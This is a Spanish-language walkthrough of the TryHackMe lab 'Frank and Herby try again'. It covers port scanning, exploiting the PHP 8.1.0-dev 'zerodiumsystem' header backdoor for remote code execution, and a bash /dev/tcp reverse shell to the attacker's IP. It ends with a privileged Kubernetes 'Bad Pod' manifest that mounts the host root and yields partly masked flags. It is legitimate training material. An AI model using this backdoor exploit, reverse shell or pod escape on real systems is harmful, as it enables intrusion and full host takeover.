## TryHackMe  <> Frank and Herby try again...
![image](https://github.com/Esevka/CTF/assets/139042999/386d8ae0-d46d-4510-8079-6a754f3f684a)

Enlace Maquina : https://tryhackme.com/room/frankandherbytryagain

Enunciado : Obtener las flags de usuario y root.
---
---

## Escaneo de puertos

-Lanzamos una traza ICMP(ping) para ver si la maquina esta activa, segun el ttl obtenido por proximidad al valor 64 podriamos decir que es una maquina Linux.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
    └─# ping -c1 10.10.62.132 
    PING 10.10.62.132 (10.10.62.132) 56(84) bytes of data.
    64 bytes from 10.10.62.132: icmp_seq=1 ttl=63 time=654 ms
    
    --- 10.10.62.132 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 653.867/653.867/653.867/0.000 ms

-Reporte Nmap (Obtenemos puertos abiertos servicios y versiones que estan corriendo).

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
    └─# nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.62.132 -oN open_ports -vvv
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 17:10 CEST
    Initiating SYN Stealth Scan at 17:10
    [...]
    PORT      STATE SERVICE      REASON
    22/tcp    open  ssh          syn-ack ttl 63
    10250/tcp open  unknown      syn-ack ttl 63
    10255/tcp open  unknown      syn-ack ttl 63
    10257/tcp open  unknown      syn-ack ttl 63
    10259/tcp open  unknown      syn-ack ttl 63
    16443/tcp open  unknown      syn-ack ttl 63
    25000/tcp open  icl-twobase1 syn-ack ttl 63
    30679/tcp open  unknown      syn-ack ttl 62

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
    └─# nmap -p 22,10250,10255,10257,10259,16443,25000,30679 -sCV 10.10.62.132 -oN info_ports
    Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 17:12 CEST
    Nmap scan report for 10.10.62.132
    Host is up (0.40s latency).
    
    PORT      STATE SERVICE     VERSION
    22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 99bf3f0eb2950e76e50f288ae925bdb1 (RSA)
    |   256 df48b7b2a2bc5a7ef9bbb8542a980309 (ECDSA)
    |_  256 ad09e8fd583ba13e377e62d244207af2 (ED25519)
    10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    | ssl-cert: Subject: commonName=microk8s@1647797913
    | Subject Alternative Name: DNS:microk8s
    | Not valid before: 2022-03-20T16:38:32
    |_Not valid after:  2023-03-20T16:38:32
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |_  http/1.1
    10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
    10257/tcp open  ssl/unknown
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Thu, 10 Aug 2023 15:12:53 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Thu, 10 Aug 2023 15:12:53 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    | ssl-cert: Subject: commonName=localhost@1691679913
    | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
    | Not valid before: 2023-08-10T14:05:12
    |_Not valid after:  2024-08-09T14:05:12
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn: 
    |   h2
    |_  http/1.1
    10259/tcp open  ssl/unknown
    | fingerprint-strings: 
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Thu, 10 Aug 2023 15:12:53 GMT
    |     Content-Length: 185
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
    |   HTTPOptions: 
    |     HTTP/1.0 403 Forbidden
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     X-Content-Type-Options: nosniff
    |     Date: Thu, 10 Aug 2023 15:12:53 GMT
    |     Content-Length: 189
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
    | ssl-cert: Subject: commonName=localhost@1691679912
    | Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
    | Not valid before: 2023-08-10T14:05:12
    |_Not valid after:  2024-08-09T14:05:12
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    16443/tcp open  ssl/unknown
    | fingerprint-strings: 
    |   FourOhFourRequest: 
    |     HTTP/1.0 401 Unauthorized
    |     Audit-Id: bc87c6de-7a21-4558-9d7a-881b541a5571
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Thu, 10 Aug 2023 15:13:21 GMT
    |     Content-Length: 129
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest: 
    |     HTTP/1.0 401 Unauthorized
    |     Audit-Id: 0c28ba2a-4ff2-4375-9326-0b124c4d8c00
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Thu, 10 Aug 2023 15:12:53 GMT
    |     Content-Length: 129
    |     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    |   HTTPOptions: 
    |     HTTP/1.0 401 Unauthorized
    |     Audit-Id: 2d8fc79d-a5ba-4388-b20d-9b968bb8174e
    |     Cache-Control: no-cache, private
    |     Content-Type: application/json
    |     Date: Thu, 10 Aug 2023 15:12:53 GMT
    |     Content-Length: 129
    |_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
    | tls-alpn: 
    |   h2
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
    | Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.62.132
    | Not valid before: 2023-08-10T15:04:01
    |_Not valid after:  2024-08-09T15:04:01
    25000/tcp open  ssl/http    Gunicorn 19.7.1
    |_http-title: 404 Not Found
    | ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
    | Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.62.132
    | Not valid before: 2023-08-10T15:04:01
    |_Not valid after:  2024-08-09T15:04:01
    |_http-server-header: gunicorn/19.7.1
    |_ssl-date: TLS randomness does not represent time
    30679/tcp open  http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
    |_http-title: FRANK RULEZZ!

Despues de lanzar los scripts basicos de reconocimiento de nmap hemos obtenido toda esta cantidad de informacion, la cual  despues de analizarla hemos encontrado algo en el puerto
    
      30679/tcp open  http        PHP cli server 5.5 or later (PHP 8.1.0-dev)
    |_http-title: FRANK RULEZZ!

## Analisis de vulnerabilidades en los servicios y explotacion de los mismos.

- Analizamos los launchpad de los servicios, pero no tenemos muy claro la Distribucion y series del sistema, ya la veremos cuando ganemos acceso a la maquina.

- Puerto 30679
  
  Analizamos la web y no vemos nada.
  
  Fuzzeamos la web en busca de directorios que nos puedan valer, encontramos  un info.php

      ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
      └─# gobuster dir -u http://10.10.62.132:30679 -w /usr/share/wordlists/dirb/common.txt -o fuzz --exclude-length 640
      ===============================================================
      Gobuster v3.5
      by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
      ===============================================================
      /info.php             (Status: 200) [Size: 66724]
      Progress: 4614 / 4615 (99.98%)
  
  ![image](https://github.com/Esevka/CTF/assets/139042999/433b67b9-738a-4b4d-80cc-2fc0cb5e67cb)

  Buscando info sobre la version de php que esta corriendo la maquina encontramos un backdoor para esta version que nos permite realizar un RCE,
  analizamos el backdoor y vemos que enviando en la cabecera de la solicitud "User-Agentt": "zerodiumsystem('" + cmd + "');" podemos ejecutar comandos.

  Exploit: https://www.exploit-db.com/exploits/49933


- Montamos nuestra Request y explotamos el RCE.

        ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
        └─# curl http://10.10.62.132:30679/ -H "User-Agentt:zerodiumsystem('ls -la');"
        total 16
        drwxrwxr-x 2 1000 1000 4096 Mar 21  2022 .
        drwxr-xr-x 3 root root 4096 Mar 30  2021 ..
        -rw-rw-r-- 1 1000 1000  640 Mar 21  2022 index.php
        -rw-rw-r-- 1 1000 1000   20 Mar 21  2022 info.php
        <html>
        <head>
            <title>FRANK RULEZZ!</title>
        </head>
        <body>
            <h1>FRANK's WORLD DOMINATION RESTART!</h1><br>

## Obtenemos Reverse Shell

-Nos ponemos en escucha con netcat en nuestra maquina a la espera de la shell.

    ┌──(root㉿kali)-[/home/kali]
    └─# nc -lnvp 1988
    listening on [any] 1988 ...
    connect to [10.9.92.151] from (UNKNOWN) [10.10.62.132] 22813
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    root@php-deploy-6d998f68b9-wlslz:/var/www/html# id
    id
    uid=0(root) gid=0(root) groups=0(root)
    root@php-deploy-6d998f68b9-wlslz:/var/www/html# 

-Ejecutamos la reverse shell a traves de curl.

    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frank-herby/nmap]
    └─# curl http://10.10.62.132:30679/ -H "User-Agentt:zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/10.9.92.151/1988 0>&1'\");"
    
-Upgradeamos la reverse shell a full tty para poder trabajar mas comodamente y no perder la conexion  
  
      root@php-deploy-6d998f68b9-wlslz:/var/www/html# SHELL=/bin/bash script -q /dev/null
    <:/var/www/html# SHELL=/bin/bash script -q /dev/null
    root@php-deploy-6d998f68b9-wlslz:/var/www/html# ^Z
    zsh: suspended  nc -lnvp 1988
                                                                                                                                                                                  
    ┌──(root㉿kali)-[/home/kali]
    └─# stty raw -echo && fg
    [1]  + continued  nc -lnvp 1988
    
    root@php-deploy-6d998f68b9-wlslz:/var/www/html# export TERM=xterm
    root@php-deploy-6d998f68b9-wlslz:/var/www/html# stty rows 42 columns 174

-Sabemos que la maquina esta ejecutando kubernetes, por lo que intentamos tirar de ---> Kubectl(no esta instalado)

Listando las variables de entorno vemos que si que verdaderanmente kubernete esta funcionando en la maquina

        root@php-deploy-6d998f68b9-wlslz:/var/www/html# env
        KUBERNETES_SERVICE_PORT_HTTPS=443
        PHP_DEPLOY_SERVICE_HOST=10.152.183.188
        KUBERNETES_SERVICE_PORT=443
        HISTCONTROL=ignorespace
        HOSTNAME=php-deploy-6d998f68b9-wlslz
        PHP_INI_DIR=/usr/local/etc/php
        PHP_DEPLOY_SERVICE_PORT=80
        PWD=/var/www/html
        PHP_DEPLOY_PORT_80_TCP_PORT=80
        HOME=/root
        KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
        PHP_DEPLOY_PORT_80_TCP=tcp://10.152.183.188:80
        PHPIZE_DEPS=autoconf         dpkg-dev         file         g++         gcc         libc-dev         make         pkg-config         re2c         bison
        TERM=xterm-256color
        PHP_DEPLOY_PORT=tcp://10.152.183.188:80
        SHLVL=3
        KUBERNETES_PORT_443_TCP_PROTO=tcp
        KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
        PHP_DEPLOY_PORT_80_TCP_ADDR=10.152.183.188
        PHP_DEPLOY_PORT_80_TCP_PROTO=tcp
        PS1=$(command printf "\[\033[01;31m\](remote)\[\033[0m\] \[\033[01;33m\]$(whoami)@$(hostname)\[\033[0m\]:\[\033[1;36m\]$PWD\[\033[0m\]\$ ")
        KUBERNETES_SERVICE_HOST=10.152.183.1
        KUBERNETES_PORT=tcp://10.152.183.1:443
        KUBERNETES_PORT_443_TCP_PORT=443
        PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        _=/usr/bin/env

-La maquina no nos da la opcion de usar curl, wget, netcat para subir kubectl a la maquina victima, por lo que vamos a tener que volver a realizar la conexion tirando de pwncat

## Obtenemos Reverse Shell mediante Pwncat.

-Nos ponemos en escucha con Pwncat y volvemos a ejecutar el exploit  con curl. 
    Con control+d cambiamos en pwncat entre la maquina local y la remota.

    ┌──(root㉿kali)-[/home/…/ctf/frank-herby/content/ssh]
    └─# pwncat-cs -lp 1988
    /usr/local/lib/python3.11/dist-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
      'class': algorithms.Blowfish,
    [18:31:46] Welcome to pwncat 🐈!                                                                                                                               __main__.py:164
    [18:32:23] received connection from 10.10.62.132:40359                                                                                                              bind.py:84
    [18:32:25] 10.10.62.132:40359: registered new host w/ db                                                                                                        manager.py:957
    (local) pwncat$
    Active Session: 10.10.62.132:40359  
    
## Enumeramos Kubernete

-Nos descargamos kubectl URL--> https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/

    ┌──(root㉿kali)-[/home/…/ctf/frank-herby/content/kube]
    └─# curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" 
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
    100   138  100   138    0     0    807      0 --:--:-- --:--:-- --:--:--   811
    100 46.9M  100 46.9M    0     0  8492k      0  0:00:05  0:00:05 --:--:-- 9059k
    
-Subimos kubectl a la maquina victima.
    
    (remote) root@php-deploy-6d998f68b9-wlslz:/var/www/html# 
    (local) pwncat$ upload ../kube/kubectl /tmp/kubectl
    /tmp/kubectl ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 49.3/49.3 MB • 1.4 MB/s • 0:00:00
    [18:46:44] uploaded 49.26MiB in 42.07 seconds                                                                                                                     upload.py:76
    
damos permisos de ejecucion ya que de lo contrario no podremos ejecutarlo
    
    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# chmod +x kubectl 

-Listamos permisos que tenemos sobre el espacio de trabajo.

Con la ayuda de kubectl hemos conseguido ver que acciones podemos realizar, los dos comandos nos indican lo mismo si no me equivoco(# Check to see if I can do everything in my current namespace)
por lo que vemos tenemos total privilegio en nuestro espacio de trabajo.

    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl auth can-i '*' '*'
    yes
    
    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl auth can-i --list 
    Resources   Non-Resource URLs   Resource Names   Verbs
    *.*         []                  []               [*]
                [*]                 []               [*]


## Explotacion del sistema, obtencion de flags.

Buscando info encontramos el siguiente articulo bastante interesante donde nos muestra varios metodos para Escalar Privilegios desde los pods de kubernete.
INFO: https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
    
En nuestro caso nos guiaremos por este metodo Bad Pod #1: Everything Allowed.

Explicacion : El proceso que haremos a continuacion sera crear un pod que montara el sistema de ficheros raiz de la maquina host(nodo microk8s)  en el directorio /host de nuestro pod, de esta manera podemos acceder al sistema de ficheros por completo del nodo y por consiguiente a las flags.

1)Obtenemos info sobre nodos,namespace y pods que es estan corriendo

    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get node
    NAME       STATUS   ROLES    AGE    VERSION
    microk8s   Ready    <none>   508d   v1.23.4-2+98fc2022f3ad3e
    
    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get namespace
    NAME              STATUS   AGE
    kube-system       Active   508d
    kube-public       Active   508d
    kube-node-lease   Active   508d
    default           Active   508d
    frankland         Active   508d
    
    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl get pods -o wide
    NAME                          READY   STATUS    RESTARTS      AGE    IP             NODE       NOMINATED NODE   READINESS GATES
    php-deploy-6d998f68b9-wlslz   1/1     Running   3 (12m ago)   507d   10.1.128.212   microk8s   <none>           <none>
    
2)Buscamos la info necesaria para montar nuestro Bad Pod, para ello obtenemos la info del pod que esta coriendo actualmente que es el unico que hay.

        (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl describe pods | grep -P "Name:|Namespace:|Node:|Image:"
   
        Name:             php-deploy-6d998f68b9-wlslz
        Namespace:        frankland
        Node:             microk8s/10.10.253.69
        Image:          vulhub/php:8.1-backdoor
         
3)Montamos nuestro Bad Pod, para ello nos basaremos en la siguiente estructura. Link --> https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

Fichero de configuracion de nuestro pod, esevka.yaml

    apiVersion: v1
    kind: Pod
    metadata:
      name: esevka
      labels:
        app: pentest
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: esevka
        image: vulhub/php:8.1-backdoor
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: noderoot
        command: [ "/bin/sh", "-c", "--" ]
        args: [ "while true; do sleep 30; done;" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
      volumes:
      - name: noderoot
        hostPath:
          path: /
    
4)Subimos nuestro fichero de configuracion a la maquina victima.

    (local) pwncat$ upload esevka.yaml /tmp/esevka.yaml
    /tmp/esevka.yaml ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 604/604 bytes • ? • 0:00:00
    [18:20:04] uploaded 604.00B in 2.06 seconds                                                                                                                       upload.py:76

5)Creamos nuestro Bad pod

    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl apply -f esevka.yaml 
    pod/esevka created
    (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl  get pods
    NAME                          READY   STATUS    RESTARTS      AGE
    php-deploy-6d998f68b9-wlslz   1/1     Running   3 (30m ago)   507d
    esevka                        1/1     Running   0             8s

6) Ejecutamos comandos en nuestro pod para poder obtener las flags

   -Como nuestro pod acepta comandos, obtenemos una shell en el host(nodo) en el que estan nuestro pods ejecutandose.

       (remote) root@php-deploy-6d998f68b9-wlslz:/tmp# ./kubectl exec esevka -it -- /bin/bash
        root@microk8s:/var/www/html#

   -Flags
  
         root@microk8s:/host/home/herby# cat user.txt 
            THM{I-2h0uld-----fr4nK}

         root@microk8s:/host/root# cat root.txt 
            THM{frank-and------still-suck}


---
---> Maquina Frank and Herby try again... completa. <---
---
---


       
       
    

    
    

